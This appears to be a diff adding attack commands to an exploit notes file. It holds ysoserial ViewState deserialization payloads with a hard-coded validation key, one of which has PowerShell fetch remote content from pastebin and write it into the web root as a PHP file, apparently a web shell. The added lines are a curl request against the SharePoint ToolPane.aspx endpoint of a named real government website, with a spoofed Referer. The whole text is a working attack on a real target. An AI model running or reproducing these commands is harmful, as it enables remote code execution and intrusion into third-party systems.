@@ -3,3 +3,15 @@ ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "echo RCE Found > c:/Users/
 
 ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "
 powershell -NoProfile -Command (Invoke-WebRequest https://pastebin.com/raw/Xih9xGK8).Content | Out-File -FilePath C:\inetpub\wwwroot\default.php -Encoding utf8" --generator="AF879508" --validationkey="FAA45BC66E06323C48961DA2AEAF077D8786291E2748330F03B6601F08523B79" --validationalg="HMACSHA256" --islegacy --minify
+
+
+curl -v -k -X POST \
+  'https://www.msj.go.cr/_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx' \
+  -H 'Host: www.msj.go.cr' \
+  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)' \
+  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
+  -H 'Accept-Encoding: gzip, deflate' \
+  -H 'Connection: close' \
+  -H 'Content-Type: application/x-www-form-urlencoded' \
+  -H 'Referer: https://www.msj.go.cr/_layouts/SignOut.aspx' \
+  --data ''
